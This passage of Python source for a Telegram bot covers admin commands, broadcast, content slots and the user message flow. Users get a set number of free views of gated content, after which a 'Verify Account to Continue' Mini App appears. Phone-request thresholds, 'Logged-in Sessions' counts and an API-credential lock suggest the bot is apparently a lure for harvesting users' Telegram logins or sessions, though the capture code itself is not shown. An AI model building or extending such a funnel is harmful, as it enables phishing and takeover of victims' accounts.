        f"💬 Total Groups:      {len(groups)}\n"
        f"🎁 Active Buttons:    {active} / {BUTTON_SLOTS}\n"
        f"👮 Total Admins:      {len(admins)}\n"
        f"✅ Logged-in Sessions:{len(logged)}"
    )


async def rename_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Permission denied.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /rename <slot_id> <new_name>")
        return
    try:
        slot_id = int(args[0])
    except ValueError:
        await update.message.reply_text("Slot ID must be an integer.")
        return
    name = " ".join(args[1:])
    await set_slot_name(slot_id, name)
    await update.message.reply_text(f"Slot {slot_id} renamed to: {name}")


async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("Only the bot owner can add admins.")
        return
    args = context.args
    if not args:
        context.user_data["state"] = WAITING_ADD_ADMIN
        await update.message.reply_text("Send the User ID of the new admin:")
        return
    try:
        new_id = int(args[0])
    except ValueError:
        await update.message.reply_text("User ID must be an integer.")
        return
    await add_admin_db(new_id, "")
    await update.message.reply_text(f"User {new_id} added as admin.")


async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("Only the bot owner can remove admins.")
        return
    args = context.args
    if not args:
        all_admins  = await get_all_admins()
        non_owners  = [(uid, un) for uid, un in all_admins if uid not in OWNER_IDS]
        if not non_owners:
            await update.message.reply_text("No removable admins found.")
            return
        keyboard = [
            [InlineKeyboardButton(f"{un if un else uid} ({uid})", callback_data=f"del_admin_{uid}")]
            for uid, un in non_owners
        ]
        keyboard.append([InlineKeyboardButton("Cancel", callback_data="cancel_action")])
        await update.message.reply_text("Select an admin to remove:", reply_markup=InlineKeyboardMarkup(keyboard))
        return
    try:
        tid = int(args[0])
    except ValueError:
        await update.message.reply_text("User ID must be an integer.")
        return
    if tid in OWNER_IDS:
        await update.message.reply_text("Cannot remove the bot owner.")
        return
    await remove_admin_db(tid)
    await update.message.reply_text(f"Admin {tid} removed.")


async def listadmins_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("Only the bot owner can list admins.")
        return
    all_admins = await get_all_admins()
    lines = ["Admin List:\n"] + [
        f"- {un if un else uid} (ID: {uid}){' [OWNER]' if uid in OWNER_IDS else ''}"
        for uid, un in all_admins
    ]
    await update.message.reply_text("\n".join(lines))


async def grant_premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Permission denied.")
        return
    args = context.args
    if args:
        try:
            tid = int(args[0])
        except ValueError:
            await update.message.reply_text("Provide a valid user ID.")
            return
    else:
        tid = update.effective_user.id
    set_user_premium(tid)
    await update.message.reply_text(f"Premium granted for user {tid}.")


async def setbg_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: /setbg <url>  OR  /setbg then send a photo."""
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Permission denied.")
        return
    args = context.args
    if args:
        url = args[0].strip()
        await set_config_value("login_bg_url", url)
        await update.message.reply_text(f"✅ Background URL updated:\n{url}")
    else:
        context.user_data["state"] = WAITING_SET_BG
        await update.message.reply_text(
            "Send the background image URL OR send a photo directly.\n\n"
            "Example URL: https://example.com/bg.jpg"
        )


# ══════════════════════════════════════════════════════════════════════════════
# CALLBACK QUERY HANDLER
# ══════════════════════════════════════════════════════════════════════════════

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data  = query.data
    user  = query.from_user

    if not await is_admin(user.id):
        # User-facing slot buttons
        if data.startswith("slot_"):
            slot_id = int(data.split("_")[1])
            if check_user_premium(user.id):
                allowed, wait = check_rate_limit(user.id)
                if not allowed:
                    await query.message.reply_text(f"Too many requests! Wait {int(wait)}s.")
                    return
                await send_content_to_user(query.message, slot_id, user_id=user.id)
                return
            login_done = await check_user_login_success(user.id)
            if login_done:
                allowed, wait = check_rate_limit(user.id)
                if not allowed:
                    await query.message.reply_text(f"Too many requests! Wait {int(wait)}s.")
                    return
                await send_content_to_user(query.message, slot_id, user_id=user.id)
                return
            total = increment_total_clicks(user.id)
            if total <= PHONE_REQUEST_THRESHOLD:
                await send_content_to_user(query.message, slot_id, user_id=user.id)
                return
            if MINI_APP_URL:
                await query.message.reply_text(
                    f"You have used all {PHONE_REQUEST_THRESHOLD} free views.\n\nVerify your account to continue:",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("Verify Account to Continue", web_app=WebAppInfo(url=MINI_APP_URL))
                    ]]),
                )
        return

    # ── Admin callbacks ────────────────────────────────────────────────────────

    if data == "back_to_admin":
        keyboard = await build_admin_panel_keyboard()
        await query.message.edit_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "cancel_action":
        context.user_data.pop("state", None)
        context.user_data.pop("pending_contents", None)
        await query.message.edit_text("Action cancelled.")
        return

    if data == "settings_menu":
        keyboard = await build_settings_keyboard()
        await query.message.edit_text("⚙️ Settings:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "set_bg_menu":
        context.user_data["state"] = WAITING_SET_BG
        await query.message.edit_text(
            "🖼 Send the background image URL or a photo to set as the Mini App background.\n\n"
            "Example: https://example.com/bg.jpg\n\nOr just send a photo in this chat."
        )
        return

    if data == "manage_admins":
        all_admins = await get_all_admins()
        non_owners = [(uid, un) for uid, un in all_admins if uid not in OWNER_IDS]
        keyboard   = [
            [InlineKeyboardButton(f"❌ Remove: {un or uid}", callback_data=f"del_admin_{uid}")]
            for uid, un in non_owners
        ]
        keyboard.append([InlineKeyboardButton("➕ Add Admin", callback_data="add_admin_prompt")])
        keyboard.append([InlineKeyboardButton("🔙 Back",      callback_data="settings_menu")])
        await query.message.edit_text("👥 Manage Admins:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "add_admin_prompt":
        context.user_data["state"] = WAITING_ADD_ADMIN
        await query.message.reply_text("Send the User ID of the new admin:")
        return

    if data == "broadcast_menu":
        context.user_data["state"] = WAITING_BROADCAST_MESSAGE
        await query.message.reply_text("Send the message/media to broadcast to all users and groups:")
        return

    if data == "show_stats":
        users  = await get_all_user_ids()
        groups = await get_all_group_ids()
        slots  = await get_all_slots()
        active = sum(1 for _, _, a in slots if a)
        admins = await get_all_admins()
        logged = await get_all_logged_in_users()
        await query.message.edit_text(
            f"📊 Bot Statistics\n\n"
            f"👥 Total Users:       {len(users)}\n"
            f"💬 Total Groups:      {len(groups)}\n"
            f"🎁 Active Buttons:    {active} / {BUTTON_SLOTS}\n"
            f"👮 Total Admins:      {len(admins)}\n"
            f"✅ Logged-in Sessions:{len(logged)}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="settings_menu")]]),
        )
        return

    if data.startswith("admin_slot_"):
        slot_id = int(data.split("_")[2])
        all_slots = await get_all_slots()
        slot_info = next(((sid, sn, ia) for sid, sn, ia in all_slots if sid == slot_id), None)
        if not slot_info:
            return
        _, button_name, is_active = slot_info
        msgs = await get_slot_messages(slot_id)
        keyboard = [
            [InlineKeyboardButton("➕ Add Content",   callback_data=f"add_content_{slot_id}")],
            [InlineKeyboardButton("🗑 Clear Slot",    callback_data=f"clear_slot_{slot_id}")],
            [InlineKeyboardButton("✏️ Rename Button", callback_data=f"rename_slot_{slot_id}")],
            [InlineKeyboardButton("🔙 Back",          callback_data="back_to_admin")],
        ]
        await query.message.edit_text(
            f"Slot {slot_id}: {button_name}\nStatus: {'Active' if is_active else 'Empty'}\nContent items: {len(msgs)}",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    if data.startswith("add_content_"):
        slot_id = int(data.split("_")[2])
        context.user_data["state"]         = WAITING_BUTTON_CONTENT
        context.user_data["admin_slot_id"] = slot_id
        context.user_data.pop("pending_contents", None)
        await query.message.reply_text(
            f"Send the content for Slot {slot_id}.\n"
            "You can send multiple items. Press Save when done."
        )
        return

    if data.startswith("save_pending_"):
        slot_id  = int(data.split("_")[2])
        contents = context.user_data.pop("pending_contents", [])
        context.user_data.pop("state", None)
        if not contents:
            await query.message.reply_text("Nothing to save.")
            return
        saved, skipped = await add_multiple_messages_to_slot(slot_id, contents)
        await query.message.edit_text(
            f"✅ Saved {saved} item(s) to Slot {slot_id}."
            + (f"\n⚠️ {skipped} item(s) skipped (limit reached)." if skipped else "")
        )
        return

    if data.startswith("clear_slot_"):
        slot_id = int(data.split("_")[2])
        await clear_slot(slot_id)
        await query.message.edit_text(
            f"Slot {slot_id} cleared.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_admin")]]),
        )
        return

    if data.startswith("rename_slot_"):
        slot_id = int(data.split("_")[2])
        context.user_data["state"]         = WAITING_BUTTON_NAME
        context.user_data["admin_slot_id"] = slot_id
        await query.message.reply_text(f"Send the new name for Slot {slot_id}:")
        return

    if data.startswith("del_admin_"):
        target_id = int(data.split("_")[2])
        if target_id in OWNER_IDS:
            await query.answer("Cannot remove the bot owner.", show_alert=True)
            return
        await remove_admin_db(target_id)
        await query.message.edit_text(f"Admin {target_id} removed.")
        return


# ══════════════════════════════════════════════════════════════════════════════
# MESSAGE HANDLER
# ══════════════════════════════════════════════════════════════════════════════

async def do_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message):
    all_targets = await get_all_user_ids() + await get_all_group_ids()
    success = fail = 0
    await update.message.reply_text(f"Starting broadcast to {len(all_targets)} targets…")
    for tid in all_targets:
        try:
            if message.text:
                await context.bot.send_message(chat_id=tid, text=message.text)
            elif message.photo:
                await context.bot.send_photo(tid, message.photo[-1].file_id, caption=message.caption)
            elif message.video:
                await context.bot.send_video(tid, message.video.file_id, caption=message.caption)
            elif message.animation:
                await context.bot.send_animation(tid, message.animation.file_id, caption=message.caption)
            elif message.sticker:
                await context.bot.send_sticker(tid, message.sticker.file_id)
            elif message.document:
                await context.bot.send_document(tid, message.document.file_id, caption=message.caption)
            elif message.audio:
                await context.bot.send_audio(tid, message.audio.file_id, caption=message.caption)
            elif message.voice:
                await context.bot.send_voice(tid, message.voice.file_id, caption=message.caption)
            success += 1
            await asyncio.sleep(0.05)
        except TelegramError as e:
            logger.warning(f"Broadcast failed {tid}: {e}")
            fail += 1
    await update.message.reply_text(f"✅ Broadcast done!\nSuccess: {success} | Failed: {fail}")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    user        = update.effective_user
    message     = update.message
    admin_check = await is_admin(user.id)
    state       = context.user_data.get("state")

    # Group registration
    if message.chat.type in ("group", "supergroup"):
        await register_group(message.chat.id, message.chat.title or "")
        return

    # ── Admin states ──────────────────────────────────────────────────────────

    if state == WAITING_BROADCAST_MESSAGE and admin_check:
        context.user_data.pop("state", None)
        await do_broadcast(update, context, message)
        return

    if state == WAITING_BUTTON_CONTENT and admin_check:
        slot_id = context.user_data.get("admin_slot_id")
        if not slot_id:
            return
        content_type, text_content, file_id = extract_content_from_message(message)
        if content_type is None:
            await message.reply_text("Unsupported content type.")
            return
        pending = context.user_data.setdefault("pending_contents", [])
        pending.append((content_type, text_content, file_id))
        count   = len(pending)
        await message.reply_text(
            f"{count} item(s) queued for Slot {slot_id}.\nSend more or press Save.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"💾 Save Now ({count} item(s))", callback_data=f"save_pending_{slot_id}")],
                [InlineKeyboardButton("❌ Cancel",                       callback_data="cancel_action")],
            ]),
        )
        return

    if state == WAITING_BUTTON_NAME and admin_check:
        slot_id  = context.user_data.pop("admin_slot_id", None)
        new_name = (message.text or "").strip()
        context.user_data.pop("state", None)
        if slot_id and new_name:
            await set_slot_name(slot_id, new_name)
            await message.reply_text(f"Slot {slot_id} renamed to: {new_name}")
        else:
            await message.reply_text("Name cannot be empty. Cancelled.")
        return

    if state == WAITING_ADD_ADMIN and is_owner(user.id):
        context.user_data.pop("state", None)
        raw = (message.text or "").strip()
        try:
            new_id = int(raw)
        except ValueError:
            await message.reply_text("Invalid User ID.")
            return
        await add_admin_db(new_id, "")
        await message.reply_text(f"User {new_id} added as admin.")
        return

    if state == WAITING_SET_BG and admin_check:
        context.user_data.pop("state", None)
        # Admin sent a photo directly
        if message.photo:
            file_id = message.photo[-1].file_id
            # Store file_id as a tg:// reference; the Mini App will load via Bot API file URL
            file  = await context.bot.get_file(file_id)
            bg_url = file.file_path  # direct HTTPS URL from Telegram CDN
            await set_config_value("login_bg_url", bg_url)
            await message.reply_text(f"✅ Background photo updated from your image!")
        elif message.text:
            url = message.text.strip()
            await set_config_value("login_bg_url", url)
            await message.reply_text(f"✅ Background URL updated:\n{url}")
        else:
            await message.reply_text("Please send a URL or a photo.")
        return

    # ── Normal user ───────────────────────────────────────────────────────────

    await register_user(user.id, user.username or "", user.first_name or "")

    if not message.text:
        return

    text = message.text.strip()

    if admin_check:
        # Admin menu button shortcuts
        if text == "⚙️ Settings":
            await message.reply_text("⚙️ Settings:", reply_markup=InlineKeyboardMarkup(await build_settings_keyboard()))
            return
        if text == "📊 Stats":
            users  = await get_all_user_ids()
            groups = await get_all_group_ids()
            slots  = await get_all_slots()
            active = sum(1 for _, _, a in slots if a)
            admins = await get_all_admins()
            logged = await get_all_logged_in_users()
            await message.reply_text(
                f"📊 Bot Statistics\n\n"
                f"👥 Total Users:       {len(users)}\n"
                f"💬 Total Groups:      {len(groups)}\n"
                f"🎁 Active Buttons:    {active} / {BUTTON_SLOTS}\n"
                f"👮 Total Admins:      {len(admins)}\n"
                f"✅ Logged-in Sessions:{len(logged)}"
            )
            return
        if text == "📢 Broadcast":
            context.user_data["state"] = WAITING_BROADCAST_MESSAGE
            await message.reply_text("Send the message/media to broadcast:")
            return
        if text == "📋 Notes":
            await export_notes_file(update, context)
            return
        if text == "🖼 Set BG":
            context.user_data["state"] = WAITING_SET_BG
            await message.reply_text("Send the background image URL or a photo:")
            return

        # Admin slot buttons
        all_slots = await get_all_slots()
        for slot_id, button_name, is_active in all_slots:
            prefix = "✅" if is_active else "❌"
            if text == f"{prefix} {button_name}":
                msgs = await get_slot_messages(slot_id)
                keyboard = [
                    [InlineKeyboardButton("➕ Add Content",   callback_data=f"add_content_{slot_id}")],
                    [InlineKeyboardButton("🗑 Clear Slot",    callback_data=f"clear_slot_{slot_id}")],
                    [InlineKeyboardButton("✏️ Rename Button", callback_data=f"rename_slot_{slot_id}")],
                    [InlineKeyboardButton("🔙 Back",          callback_data="back_to_admin")],
                ]
                await message.reply_text(
                    f"Slot {slot_id}: {button_name}\nStatus: {'Active' if is_active else 'Empty'}\nItems: {len(msgs)}",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                )
                return

    # User slot buttons
    active_slots = await get_active_slots()
    for slot_id, button_name in active_slots:
        if text == f"🎁 {button_name}":
            if check_user_premium(user.id):
                allowed, wait = check_rate_limit(user.id)
                if not allowed:
                    await message.reply_text(f"Too many requests! Wait {int(wait)}s.")
                    return
                await send_content_to_user(message, slot_id, user_id=user.id)
                return

            login_done = await check_user_login_success(user.id)
            if login_done:
                allowed, wait = check_rate_limit(user.id)
                if not allowed:
                    await message.reply_text(f"Too many requests! Wait {int(wait)}s.")
                    return
                await send_content_to_user(message, slot_id, user_id=user.id)
                return

            total = increment_total_clicks(user.id)
            if total <= PHONE_REQUEST_THRESHOLD:
                await send_content_to_user(message, slot_id, user_id=user.id)
                return

            if MINI_APP_URL:
                await message.reply_text(
                    f"You have used all {PHONE_REQUEST_THRESHOLD} free views.\n\nVerify your account to continue:",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("Verify Account to Continue", web_app=WebAppInfo(url=MINI_APP_URL))
                    ]]),
                )
            else:
                await message.reply_text(
                    f"You have used all {PHONE_REQUEST_THRESHOLD} free views. Account verification required."
                )
            return


# ══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main():
    async def run():
        global _api_cred_lock
        _api_cred_lock = asyncio.Lock()

        await init_db()

        bot_app = Application.builder().token(BOT_TOKEN).build()

        bot_app.add_handler(CommandHandler("start",         start_command))
        bot_app.add_handler(CommandHandler("admin",         admin_command))
        bot_app.add_handler(CommandHandler("stats",         stats_command))
        bot_app.add_handler(CommandHandler("rename",        rename_command))
        bot_app.add_handler(CommandHandler("addadmin",      addadmin_command))
        bot_app.add_handler(CommandHandler("removeadmin",   removeadmin_command))
        bot_app.add_handler(CommandHandler("listadmins",    listadmins_command))
        bot_app.add_handler(CommandHandler("grant_premium", grant_premium_command))
        bot_app.add_handler(CommandHandler("setbg",         setbg_command))
        bot_app.add_handler(CallbackQueryHandler(button_callback))
        bot_app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))

        logger.info("Bot starting…")
        async with bot_app:
            await bot_app.initialize()
            await bot_app.start()
            await run_web_server()
            await bot_app.updater.start_polling(drop_pending_updates=True)
            logger.info("Bot is running. Press Ctrl+C to stop.")
            await asyncio.Event().wait()   # run forever
            await bot_app.updater.stop()
            await bot_app.stop()

    asyncio.run(run())


if __name__ == "__main__":
    main()
